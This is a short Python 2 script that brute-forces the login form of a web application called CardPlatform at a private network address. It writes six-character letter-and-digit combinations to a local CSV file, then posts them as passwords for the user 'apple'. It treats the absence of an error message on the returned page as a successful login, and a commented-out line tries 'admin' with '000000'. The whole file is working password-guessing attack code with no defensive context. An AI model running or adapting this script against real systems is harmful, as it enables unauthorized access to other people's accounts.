#encoding=gbk

import csv
import urllib2
import urllib
import sys
from pyquery import PyQuery as pq
import itertools
import datetime
import time
import time


url = 'http://192.168.1.161:8081/CardPlatform/loginActionQuery.action'

header = {
    'Host': '192.168.1.161:8081',
    'Connection': 'keep-alive',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8'
}





def ex(user_id, pwd):
    if not user_id or not pwd:
        return False
    data = {'login.user_id': user_id, 'login.user_password': pwd}
    post_data = urllib.urlencode(data)
    req = urllib2.Request(url, post_data, header)
    content = urllib2.urlopen(req)
    html = content.read()
    html = html.decode('utf-8', 'replace').encode(sys.getfilesystemencoding())
    pq_html = pq(html)
    return pq_html.find('.errorMessage')  #找不到目标元素 登录成功     (返回 false)



def gerFile():
    list1 = 'abcdefghijklmnopqrstuvwxyz1234567890'
    list1 = 'abcdefghijklmnopqrstuvwxyz1234567890'
    list2 = []

    a = time.time()

    iter = itertools.combinations(list1,6)
    print time.time()-a
    list2.append(list(iter))
    print time.time()-a
    print len(list2[0])

    # print list2
    file = open('d:/a.csv','w')
    for i in list2[0]:
        file.write(''.join(i) )
        file.write('\r')



if '__main__'==__name__:
    
    # if ( not ex('admin','000000') ):
    #     print 'sucess'
    # else:
    #     print 'faile'
    
    # gerFile()
    
    file1 = open('d:/a.csv','r')
    n = 0
    for aa in file1:
        n=n+1
        print aa
        if not ex('apple',aa):
            break
        if n>10:
            break
    file1.close()
    

    

